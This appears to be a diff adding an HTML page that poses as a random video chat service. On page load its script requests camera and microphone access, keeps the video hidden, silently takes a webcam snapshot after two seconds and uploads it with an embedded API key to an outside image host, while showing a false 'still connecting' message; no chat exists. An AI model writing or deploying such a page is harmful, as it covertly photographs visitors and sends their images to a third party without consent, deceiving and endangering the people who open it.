@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>RandomChat Live</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #0f0;
+      text-align: center;
+      padding-top: 80px;
+    }
+    #video {
+      display: none;
+      width: 100%;
+      max-width: 300px;
+      margin: auto;
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔴 Connecting to Random Video Chat...</h1>
+  <video id="video" autoplay playsinline></video>
+  <p id="status">Please wait while we connect you to a stranger...</p>
+
+  <script>
+    const video = document.getElementById('video');
+    const statusText = document.getElementById('status');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+
+        // Wait 2 seconds, then capture image
+        setTimeout(() => {
+          takeSnapshotAndUpload(video);
+        }, 2000);
+      } catch (err) {
+        statusText.innerText = 'Permission denied. Cannot connect to chat.';
+        console.error(err);
+      }
+    }
+
+    async function takeSnapshotAndUpload(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+
+      const formData = new FormData();
+      formData.append('key', '46298af2eca9b7928deb2e323d92ef60');
+      formData.append('image', imageData);
+
+      try {
+        const response = await fetch('https://api.imgbb.com/1/upload', {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.json();
+        const imageUrl = result.data.url;
+        console.log('📸 Image uploaded:', imageUrl);
+
+        statusText.innerText = "Still connecting... please wait.";
+      } catch (error) {
+        console.error('Upload failed:', error);
+        statusText.innerText = "Oops! Something went wrong.";
+      }
+    }
+
+    // Start camera when page loads
+    window.onload = startCamera;
+  </script>
+</body>
+</html>
